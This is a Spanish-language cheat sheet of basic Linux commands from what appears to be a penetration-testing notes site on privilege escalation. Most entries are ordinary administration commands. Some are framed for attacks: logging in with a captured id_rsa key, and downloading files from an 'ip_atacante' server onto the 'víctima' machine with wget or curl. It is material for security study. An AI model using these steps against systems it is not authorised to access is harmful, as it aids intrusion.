---
title: "Comandos Básicos"
layout: "single"
category: "Linux PrivEsc"
slug: "linux-privesc/comandos-basicos"
date: "2025-09-30"
---

### Indice
- [Recolectar informacion](#recolectar)
- [Usuarios y grupos](#usuarios_grupos)
- [Operaciones con ficheros](#ficheros)
- [Permisos de ficheros](#ficheross)
- [Stdin, Stdout, Stderr](#stdin)
- [Variables](#var)
- [Concatenacion](#concat)
- [Búsqueda](#bus)
- [SSH](#ssh)
- [Networking](#net)
- [Compartir ficheros entre maquinas](#comp)
- [Comandos FTP](#ftp)
- [Compresion/descompresion de ficheros](#tar)
- [Regex](#regex)



<a name="recolectar"></a>
### Recolectar información
```bash
* uname -r -a (system y kernel)
* hostname
* hostname -I (IP)
* arp -a (tabla arp)
* whoami (usuario actual)
* id (grupo al que pertenece usuario actual)
* ps -aux (procesos)
* top (procesos en tiempo real)
* bg (ver procesos en 2º plano)
* pwd (ver directorio en el que estamos situados)
* last (ultimos logins)
* df -h (ver espacio libre en el sistema)
* fdisk -l (ver particiones y tipos)
* watch ls -la /bin/bash (ver si un binario cambia sus permisos cuando hay una tarea cron para ello)
```


<a name="usuarios_grupos"></a>
### usuarios y grupos
```bash
* groupadd [grupo]
* adduser [usuario]
* usermod [usuario]
  * -d [directorio] (especificar home)
  * -g [grupo] (especificar grupo)
  * -p [pass] (especificar contraseña)
  * -s [shell] (especificar la shell)
  * -m [directorio] (mover directorio home) (solo se puede usar con -d)
```

<a name="ficheros"></a>
### Ficheros
```bash
* cd [directorio] (cambiar directorio)
* ls [directorio] (listar directorio)
  * -l (formato largo)
  * -a (archivos ocultos)
  * -R (listado recursivo)
* tree (ver arbol de ficheros)
* mv [fichero] (mover, renombrar)
* cp [fichero1] [fichero2] (copiar)
* rm [fichero] (eliminar)
  * -r (recursivamente)
  * -f (forzar)
* ln -s [fichero] [enlace] (link simbolico)

```


<a name="ficheross"></a>
### Permisos en ficheros
```bash
* chmod 755 [fichero] (todos al propietario, leer al resto)
* chown [usuario] [fichero] (cambiar propietario)
* chown [usuario]:[grupo] [fichero] (cambiar propietario y grupo)
* chgrp [grupo] [fichero] (cambiar grupo a un fichero)
```

<a name="stdin"></a>
### Stdin | Stdout | Stdr

0, hace referencia a la entrada (teclado)
1, hace referencia a la salida (pantalla)
2, hace referencia a la salida (errores)
```bash
* [comando] 2>/dev/null (enviar errores a dev/null)
* [comando ]&>/dev/null (enviar todo a dev/null, tanto salida como errores)
* [comando2] >&1 (enviar errores a pantalla [cuando se ejecuta programa en segundo plano])
* [comando] & (ejecutar en 2º plano)
* nohup [comando] & (ejecutar en 2º plano)
* [comando] & disown (ejecutar en 2º plano, independiente del proceso padre)
```


<a name="var"></a>
### Variables Bash y alias
* $HOME
* $BASH
* $SHELL
* export $NAME=value (establece la variable de entorno al valor indicado)
* alias [alias]=[comando] (establecer un alias al comando)
<a name="concat"></a>
### Concatenacion
```bash
* comando1 ; comando2 (ejecuta el primer comando, luego el segundo)
* comando1 && comando2 (ejecuta el segundo, solo si el primero es exitoso)
* comando1 || comando2 (or, ejecuta el comando2 si el primero no es exitoso)
* comando1 | comando2 (envia la salida el primero, al segundo)
* comando1 |& comando2 (envia erroes del comando1 al comando2)
```

<a name="bus"></a>
### Búsqueda
```bash
* grep [palabra](buscar lineas en fichero)
* find (buscar ficheros)
  * -name
* whereis [programa](encontrar binario)
* which [programa](como whereis)
* locate -i [directorio opcional] [name] (encontrar ficheros rapidamente)
* head [fichero] (primeras 10 lineas fichero)
* tail [fichero] (10 ultimas)
* awk '[patron] {print $numero}' [fichero] (buscar lineas que coinciden con patron)
```

  * EJEMPLO mas útil: ps | awk -F ":" '{print $2}' (muestra la segunda columna del resultado del comando `ps` cuyo delimitador sea ':')
### Compresion ficheros
```bash
* tar -cf [file.tar] [file](comprimir)
* tar -xf [file.tar ](descomprimir)

```
<a name="ssh"></a>
### conexion SSH
```bash
* ssh user@host
* ssh -p user@host (indicar puerto)
```

#### Conexion SSH con id_rsa

Teniendo el fichero id_rsa del usuario podemos realizar una conexión. En ocasiones no necesitamos contraseña. En caso de que sí, se puede intentar crackear con [Ataques fuerza bruta](4%20-%20Hacking%20genérico/Ataques%20fuerza%20bruta.md)  
Importante CAMBIAR LOS PEEMISOS A 600  
```bash
chmod 600 id_rsa
ssh <usuario>@<ip> -i id_rsa
```
<a name="net"></a>
#### Copiar ficheros con SSH por SCP
```bash
scp <origen> <destino>
"SUBIR FICHEROS" scp /home/kali/file.txt usuario@servidor:/ruta
"DESCARGAR FICHEROS" scp usuario@servidor:/file.txt /home/kali.file.txt
```
### Networking
```bash
* ip addr show (ver ip)
* ifconfig (ver todas las interfaces)
* netstat (ver puertos a la escucha)
* wget [url] (descargar fichero desde url)
* curl -O (igual que wget)
```

<a name="comp"></a>
### Compartir ficheros entre maquinas
Podemos compartir ficheros con la máquina víctima montando un servidor http en python. Para ello nos posicionamos en la ruta donde tengamos el fichero y ejecutamos
```bash
python3 -m http.server 5000

El puerto 80 en ocasiones requiere permisos de root
```

desde la máquina víctima hacemos:
```bash
wget <http://ip_atacante/recurso>
```

otra opción sería
```bash
curl <http://ip_atacante/recurso> -o recurso
```

### FTP
<a name="ftp"></a>
```bash
ftp <ip>
ftp user@ip
get <fichero>
mget *
put <fichero>

```

### Compresion/Descompresion de ficheros
<a name="tar"></a>
#### TAR
```bash
tar -xf fichero.tar "DESCOMPRIMIR"
tar -xzf archivo.tar.gz "DESCOMPRIMIR tar.gz"
tar -cf fichero.tar fichero_a_comprimir.txt "COMPRIMIR"
tar -cf fichero.tar fichero_a_comprimir1.txt fichero_a_comprimir2.txt "COMPRIMIR VARIOS"
```

#### GZIP
```bash
gzip -c documento.txt > comprimido.gz "COMPRIMIR"
gzip -d documento.gz "DESCOMPRIMIR"
gunzip documento.gz "DESCOMPRIMIR"
```

### Regex (Expresiones regulares)
```python
#Sustitución de caracteres
tr '\' ' '

#Eliminacion caracteres
tr -d ' ' 

#Seleccion de culumnas
EJ: imprimir columna 2
awk '{print $2}'

#Mostrar lineas distintas de
grep -v <palabra>

#No distinguir mayusculas de minusculas
grep -i

#Encontrar palabra en conjunto de archivos
grep -l <palabra> ./*

#Invertir lineas en un fichero
tac <fichero_original> >> <fichero_destino>

# Tratamiento con sed (p.e eliminar la ultima coma de una linea)
	#EXPLICACION: "s" es pra sustitución
	# ,$ hace referencia a la ultima coma
	# \n hace referencia a un salto de linea
	# hay que separar los argumentos con una "/" SIEMPRE
sed 's/,$/\n/'

```

### SQL
```bash
# Conexion a base de datos MYSQL, ojo a como está la contraseña, no es un error. la clave va pegada al -p.

mysql -h <ip> -u <usuario> -p<contraseña>

# Ver bases de datos
show databases;

# utilizar una base de datos
use <bbdd>;

# Ver tablas de una base de datos
show tables;

# Sentencias SQL básicas
SELECT <columna/s> FROM <tabla>;
SELECT <columna/s> FROM <tabla> WHERE id=1;


```
